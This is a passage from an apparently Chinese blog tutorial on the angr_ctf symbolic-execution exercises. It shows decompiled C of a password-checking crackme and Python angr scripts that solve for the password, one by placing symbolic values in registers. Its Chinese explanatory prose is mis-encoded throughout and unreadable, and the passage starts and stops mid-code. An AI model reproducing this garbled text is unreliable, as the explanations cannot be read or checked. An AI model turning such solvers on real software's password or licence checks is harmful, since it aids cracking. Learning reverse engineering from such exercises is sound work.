class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210501165755.png" alt=""></p><h2 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h2><p>å…ˆçœ‹ä¸‹åç¼–è¯‘ä»£ç ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// ebx</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// ST1C_4</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// ST14_4</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">get_user_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> v5<span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token function">complex_function_1</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token function">complex_function_2</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  v10 <span class="token operator">=</span> <span class="token function">complex_function_3</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">||</span> v9 <span class="token operator">||</span> v10 <span class="token punctuation">)</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Good Job."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">get_user_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-18h]</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-14h]</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>  v4 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%x %x %x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> v1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">complex_function_1</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1 <span class="token operator">^</span> <span class="token number">0x446D96EE</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">65034369</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x8C9C6B06</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">506201578</span> <span class="token operator">+</span> <span class="token number">1306428696</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x11B9DE9C</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1979576599</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xF1A3C94B</span><span class="token punctuation">)</span>           <span class="token operator">+</span> <span class="token number">1419260309</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x92896C8</span><span class="token punctuation">)</span>         <span class="token operator">-</span> <span class="token number">383475520</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xA2B0AE1F</span><span class="token punctuation">)</span>       <span class="token operator">-</span> <span class="token number">963798047</span>       <span class="token operator">+</span> <span class="token number">2098953909</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">complex_function_2</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1 <span class="token operator">^</span> <span class="token number">0xFA55CC03</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1408082538</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xF637E394</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1155370027</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC6F7A83A</span><span class="token punctuation">)</span>                     <span class="token operator">-</span> <span class="token number">286307825</span>                     <span class="token operator">+</span> <span class="token number">847018205</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x9E46424</span><span class="token punctuation">)</span>                   <span class="token operator">+</span> <span class="token number">829215924</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xD0D3A782</span><span class="token punctuation">)</span>                 <span class="token operator">+</span> <span class="token number">267178483</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x6595F087</span><span class="token punctuation">)</span>               <span class="token operator">+</span> <span class="token number">1151870818</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x8529CCF3</span><span class="token punctuation">)</span>             <span class="token operator">-</span> <span class="token number">2092276806</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xCBDB3CE1</span><span class="token punctuation">)</span>           <span class="token operator">-</span> <span class="token number">1204004829</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x6E55C638</span><span class="token punctuation">)</span>         <span class="token operator">+</span> <span class="token number">1720283269</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xAEFB68D3</span><span class="token punctuation">)</span>       <span class="token operator">+</span> <span class="token number">1956986548</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">complex_function_3</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a1 <span class="token operator">^</span> <span class="token number">0xFD2D6C3F</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">831184883</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x6633C3C9</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">358411895</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xC4FF8776</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">763680393</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xEAE4DB7B</span><span class="token punctuation">)</span>        <span class="token operator">-</span> <span class="token number">954507130</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xF35005F6</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p>ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥çš„ä¸‰ä¸ªå€¼è¿›è¡Œäº†ä¸åŒçš„ä¸‰ç§å˜æ¢ï¼Œæœ€ç»ˆéœ€è¦å˜æ¢åçš„ä¸‰ä¸ªå˜é‡åŒæ—¶æ»¡è¶³ä¸º<code>false</code>ï¼Œå…¶å®æœ¬è´¨ä¸Šå’Œä¹‹å‰çš„é¢˜ä¸€æ ·ï¼Œæˆ‘ä»¬ä¾ç„¶èƒ½ç”¨ä¹‹å‰çš„æ–¹æ³•è§£å†³ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">basic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">'03_angr_symbolic_registers'</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">)</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span>    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token comment"># Define a function that checks if you have found the state you are looking</span>    <span class="token comment"># for.</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># Dump whatever has been printed out by the binary so far into a string.</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># Return whether 'Good Job.' has been printed yet.</span>        <span class="token comment"># (!)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>        <span class="token comment"># return True if b'Good Job.' in stdout_output else False</span>        <span class="token comment"># Same as above, but this time check if the state should abort. If you return</span>        <span class="token comment"># False, Angr will continue to step the state. In this specific challenge, the</span>        <span class="token comment"># only time at which you will know you should abort is when the program prints</span>        <span class="token comment"># "Try again."</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token comment"># Tell Angr to explore the binary and find any state that is_successful identfies</span>    <span class="token comment"># as a successful state by returning True.</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] Success, flag is &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>solution<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not find the solution'</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    basic<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502101525.png" alt=""></p><p>è¿™éƒ¨åˆ†ä»£ç åº”è¯¥å¾ˆç†Ÿç»ƒäº†ï¼Œä½†æ€»æ˜¯ç”¨é‚£ä¸‰æ¿æ–§ï¼Œé‡åˆ°æ›´åŠ å¤æ‚çš„é—®é¢˜å¯èƒ½å°±æŠ¡ä¸åŠ¨äº†ã€‚æœ¬é¢˜å®é™…ä¸Šæ˜¯å¸Œæœ›æˆ‘ä»¬å­¦ä¼šåˆ©ç”¨angræ¥å®ç°å¯¹å¯„å­˜å™¨ä¸­å€¼çš„æ“ä½œã€‚</p><ul><li>éœ€è¦æ§åˆ¶çš„å˜é‡åœ¨<code>get_user_input</code> è¾“å…¥éƒ¨åˆ†ï¼Œæˆ‘ä»¬çœ‹ä¸‹è¯¥æœ¬éƒ¨åˆ†çš„æ±‡ç¼–ä»£ç </li></ul><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502102553.png" alt=""></p><blockquote><p>è·å–äº†ä¸‰ä¸ªè¾“å…¥ï¼Œå¹¶åˆ†åˆ«ä¿å­˜åˆ°äº†<code>eax</code>,<code>ebx</code>,<code>edx</code>å¯„å­˜å™¨ä¸­(<strong>æ³¨æ„ç¬¬ä¸€ä¸ªæ”¹å˜å¯„å­˜å™¨å€¼ç›¸åº”çš„å†…å­˜åœ°å€<code>0804881E</code>ï¼Œåé¢ç”¨åˆ°</strong>)ï¼Œæ„å‘³ç€æˆ‘ä»¬å¦‚æœèƒ½ä¿®æ”¹å¯„å­˜å™¨çš„å€¼ï¼Œé‚£ä¹ˆç›´æ¥ä¿®æ”¹è¿™ä¸‰ä¸ªå¯„å­˜å™¨ï¼Œå°±ä¸éœ€è¦ä»mainå‡½æ•°å…¥å£è¿›å…¥äº†ï¼Œæ°å·§angrå°±æ”¯æŒè¿™ç§æ“ä½œã€‚é™¤äº†ä»æ±‡ç¼–ä»£ç ï¼Œä¹Ÿå¯ä»¥ä»åç¼–è¯‘åçš„æ³¨é‡Šä¸­å‘ç°ä¼ å…¥çš„ä¸‰ä¸ªå˜é‡å­˜å‚¨çš„å¯„å­˜å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/GentleCP/ImgUrl/20210502102840.png" alt=""></p></blockquote><ul><li>å½“æˆ‘ä»¬ä¸ä»mainå‡½æ•°å…¥å£è¿›å…¥æ—¶ï¼Œåœ¨åˆå§‹åŒ–<code>state</code>çš„æ—¶å€™å°±ä¸ç”¨<code>entry_state()</code>äº†ï¼Œæ”¹ç”¨<code>blank_state()</code>ï¼Œå®ƒç”¨äºåˆ›å»ºä¸€ä¸ªç©ºçš„çŠ¶æ€ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯â€œç©ºé™â€åˆ°ç¨‹åºçš„æŸä¸€ä½ç½®çš„ï¼Œæ­¤æ—¶ç¨‹åºæ‰€æœ‰çš„çŠ¶æ€éœ€è¦æˆ‘ä»¬è‡ªå·±æŒ‡å®šï¼Œä¸‹è¡¨è§£é‡Šäº†å¸¸ç”¨çš„çŠ¶æ€æ„é€ æ–¹æ³•<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="AngrCTF_FITM/Angr_CTFä»å…¥é—¨åˆ°ç²¾é€šï¼ˆä¸€ï¼‰.md at master Â· ZERO-A-ONE/AngrCTF_FITM (github.com)">[1]</span></a></sup>ï¼š</li></ul><div class="table-container"><table><thead><tr><th>åç§°</th><th>æè¿°</th></tr></thead><tbody><tr><td><code>entry_state()</code></td><td>æ„é€ ä¸€ä¸ªå·²ç»å‡†å¤‡å¥½ä»å‡½æ•°å…¥å£ç‚¹(<code>main</code>)æ‰§è¡Œçš„çŠ¶æ€</td></tr><tr><td><code>blank_state()</code></td><td>æ„é€ ä¸€ä¸ªâ€œç©ºçŠ¶æ€â€ï¼Œå®ƒçš„å¤§å¤šæ•°æ•°æ®éƒ½æ˜¯æœªåˆå§‹åŒ–çš„ã€‚å½“ä½¿ç”¨æœªåˆå§‹åŒ–çš„çš„æ•°æ®æ—¶ï¼Œä¸€ä¸ªä¸å—çº¦æŸçš„ç¬¦å·å€¼å°†ä¼šè¢«è¿”å›ï¼Œ<strong>è®°ä½å½“éœ€è¦ä»ç¨‹åºä¸­ä»»æ„ä¸€ç‚¹æ‰§è¡Œçš„æ—¶å€™ä½¿ç”¨</strong></td></tr><tr><td><code>call_state()</code></td><td>æ„é€ ä¸€ä¸ªå·²ç»å‡†å¤‡å¥½æ‰§è¡ŒæŸä¸ªå‡½æ•°çš„çŠ¶æ€</td></tr><tr><td><code>full_init_state()</code></td><td>æ„é€ ä¸€ä¸ªå·²ç»æ‰§è¡Œè¿‡æ‰€æœ‰ä¸éœ€è¦æ‰§è¡Œçš„åˆå§‹åŒ–å‡½æ•°ï¼Œå¹¶å‡†å¤‡ä»å‡½æ•°å…¥å£ç‚¹æ‰§è¡Œçš„çŠ¶æ€ã€‚æ¯”å¦‚ï¼Œå…±äº«åº“æ„é€ å‡½æ•°ï¼ˆconstructorï¼‰æˆ–é¢„åˆå§‹åŒ–å™¨ã€‚å½“è¿™äº›æ‰§è¡Œå®Œä¹‹åï¼Œç¨‹åºå°†ä¼šè·³åˆ°å…¥å£ç‚¹</td></tr></tbody></table></div><p>æœ‰äº†ä¸Šé¢çš„åŸºç¡€çŸ¥è¯†åï¼Œçœ‹é¢˜è§£æºç ï¼Œæˆ‘ä¼šåœ¨å¿…è¦çš„ä½ç½®æ·»åŠ æ³¨é‡Šå¸®åŠ©ç†è§£ï¼š</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripy<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path_to_binary <span class="token operator">=</span> <span class="token string">"03_angr_symbolic_registers"</span>    project <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span>path_to_binary<span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token comment"># 0x0804881Eã€€è¿™ä¸ªåœ°å€æ˜¯å°†è¾“å…¥å€¼ä¼ å…¥å¯„å­˜å™¨çš„èµ·å§‹åœ°å€ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬éœ€è¦çš„â€œç©ºé™â€ä½ç½®</span>    start_address <span class="token operator">=</span> <span class="token number">0x0804881E</span>    <span class="token comment"># ä¸å†æ˜¯entry_state()äº†ï¼Œé€šè¿‡ç»™å®šçš„èµ·å§‹åœ°å€ï¼Œåœ¨è¯¥å¤„åˆ›å»ºä¸€ä¸ªç©ºç™½çŠ¶æ€</span>    initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span>start_address<span class="token punctuation">)</span>    <span class="token comment"># è¿™é‡Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä½å‘é‡ï¼Œå®é™…ä¸Šå°±æ˜¯ä¿å­˜å¯„å­˜å™¨å€¼çš„å˜é‡ï¼ˆå˜é‡åç§°éšæ„ï¼‰ï¼Œåœ¨ç¬¦å·æ‰§è¡Œä¸­ç”¨çš„ç¬¦å·å˜é‡ï¼Œå¦‚\alphaï¼Œ</span>    <span class="token comment"># åˆ¶å®š32ä½æ˜¯å› ä¸ºç¨‹åºæœ¬èº«æ˜¯32ä½çš„</span>    passwd_size_in_bits <span class="token operator">=</span> <span class="token number">32</span>    passwd0 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'passwd0'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    passwd1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'passwd1'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    passwd2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'passwd2'</span><span class="token punctuation">,</span> passwd_size_in_bits<span class="token punctuation">)</span>    <span class="token comment"># å°†ç¬¦å·å˜é‡å­˜å‚¨åˆ°å¯„å­˜å™¨ä¸­ï¼Œåœ¨ç¨‹åºæ¨¡æ‹Ÿæ‰§è¡Œé˜¶æ®µå°±ç”±è¿™äº›ç¬¦å·å€¼ä»£æ›¿å®é™…è¾“å…¥æ‰§è¡Œï¼Œä»¥éå†æ‰€æœ‰è·¯å¾„</span>    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> passwd0    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>ebx <span class="token operator">=</span> passwd1    initial_state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>edx <span class="token operator">=</span> passwd2    simulation <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">is_successful</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Good Job.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">should_abort</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>        stdout_output <span class="token operator">=</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span> <span class="token keyword">if</span> <span class="token string">'Try again.'</span> <span class="token keyword">in</span> stdout_output<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">False</span>    simulation<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>is_successful<span class="token punctuation">,</span> avoid<span class="token operator">=</span>should_abort<span class="token punctuation">)</span>    <span class="token keyword">if</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">:</span>        <span class="token comment"># åˆ†åˆ«å¯¹ä¸‰ä¸ªç¬¦å·å˜é‡è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œè·å–æµ‹è¯•ç”¨ä¾‹ï¼Œformat(...,'x')æ˜¯å°†16è¿›åˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>        solution_state <span class="token operator">=</span> simulation<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        solution0 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>passwd0<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>        solution1 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>passwd1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>        solution2 <span class="token operator">=</span> <span class="token builtin">format</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>passwd2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'x'</span><span class="token punctuation">)</span>        <span class="token comment"># ä¸‹é¢çš„seæ–¹æ³•ä¹Ÿæ˜¯å¯è¡Œçš„ï¼Œä½†å®˜æ–¹å·²ç»æç¤ºè¦ä¸¢å¼ƒä½¿ç”¨äº†ï¼Œå»ºè®®è¿˜æ˜¯ç”¨ä¸Šé¢çš„</span>        <span class="token comment"># solution0 = format(solution_state.se.eval(passwd0),'x')</span>        <span class="token comment"># solution1 = format(solution_state.se.eval(passwd1),'x')</span>        <span class="token comment"># solution2 = format(solution_state.se.eval(passwd2),'x')</span>        solution <span class="token operator">=</span> solution0 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution1 <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> solution2        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Success! Solution is: &#123;&#125;"</span><span 